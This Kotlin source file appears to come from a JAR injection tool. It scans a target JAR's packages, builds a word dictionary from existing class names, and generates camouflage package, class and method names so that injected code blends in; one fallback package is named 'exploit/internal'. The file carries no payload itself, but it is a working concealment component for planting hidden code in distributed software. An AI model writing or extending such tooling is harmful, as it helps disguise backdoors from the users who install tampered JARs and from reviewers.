package com.tmquan2508.inject.utils

import com.tmquan2508.inject.cli.Logs
import java.io.File
import java.util.Enumeration
import java.util.zip.ZipEntry
import java.util.zip.ZipFile
import kotlin.random.Random

data class Camouflage(
    val packageName: String,
    val namePrefix: String,
    val methodName: String
)

fun generateCamouflagePlan(targetJarFile: File): Camouflage {
    Logs.info("Analyzing JAR file to generate camouflage plan...")
    val packageStructure = scanJarForPackageStructure(targetJarFile)

    if (packageStructure.isEmpty()) {
        Logs.warn("Target JAR contains no class files. Using fallback camouflage.")
        return Camouflage("exploit/internal", "InternalTask", "run")
    }

    val packagesSortedByClassCount = packageStructure.toList().sortedByDescending { it.second.size }
    val (chosenPackagePath, classNamesInPackage) = packagesSortedByClassCount[Random.nextInt(packagesSortedByClassCount.size.coerceAtMost(4))]
    Logs.info("Selected package for camouflage: '$chosenPackagePath'")

    val dictionary = buildWordDictionaryFrom(classNamesInPackage)

    if (dictionary.isEmpty()) {
        Logs.warn("Could not build a word dictionary from package '$chosenPackagePath'. Using fallback name.")
        return Camouflage(chosenPackagePath, "Task", "execute")
    }
    Logs.info("Built a dictionary with ${dictionary.size} words.")

    val classPrefix = buildUniqueWordName(dictionary, classNamesInPackage.map { it.substringBeforeLast(".") }, 1..2)
    var methodName = buildUniqueWordName(dictionary, emptyList(), 1..1)
    methodName = methodName.replaceFirstChar { it.lowercase() }
    Logs.info("Generated camouflage names: prefix='$classPrefix', method='$methodName'")

    return Camouflage(chosenPackagePath, classPrefix, methodName)
}

private fun scanJarForPackageStructure(jarFile: File): Map<String, List<String>> {
    val packageMap = mutableMapOf<String, MutableList<String>>()
    ZipFile(jarFile.canonicalPath).use { zipFile ->
        val zipEntries: Enumeration<out ZipEntry> = zipFile.entries()
        while (zipEntries.hasMoreElements()) {
            val entry = zipEntries.nextElement() as ZipEntry
            if (entry.isDirectory || !entry.name.endsWith(".class")) continue

            val fullPath = entry.name
            val packageName = fullPath.substringBeforeLast("/", "")
            val className = fullPath.substringAfterLast("/")
            packageMap.getOrPut(packageName) { mutableListOf() }.add(className)
        }
    }
    return packageMap
}

private fun buildWordDictionaryFrom(classNames: List<String>): List<String> {
    val dictionary = mutableSetOf<String>()
    for (classNameWithExtension in classNames) {
        val className = classNameWithExtension.substringBeforeLast(".")
        splitCamelCase(className)
            .map { it.replace("$", "") }
            .filter { it.length > 2 }
            .forEach { dictionary.add(it) }
    }
    return dictionary.toList()
}

private fun buildUniqueWordName(dictionary: List<String>, existingNames: List<String>, wordCountRange: IntRange): String {
    var name: String
    var attempts = 0
    do {
        name = (1..Random.nextInt(wordCountRange.first, wordCountRange.last + 1))
            .map { dictionary[Random.nextInt(dictionary.size)] }
            .joinToString("")
        if (attempts > 10) name += attempts.toString()
        attempts++
    } while (existingNames.contains(name))
    return name
}

private fun splitCamelCase(pascalCaseString: String): List<String> {
    return pascalCaseString.split("(?<!(^|[A-Z]))(?=[A-Z])|(?<!^)(?=[A-Z][a-z])".toRegex())
}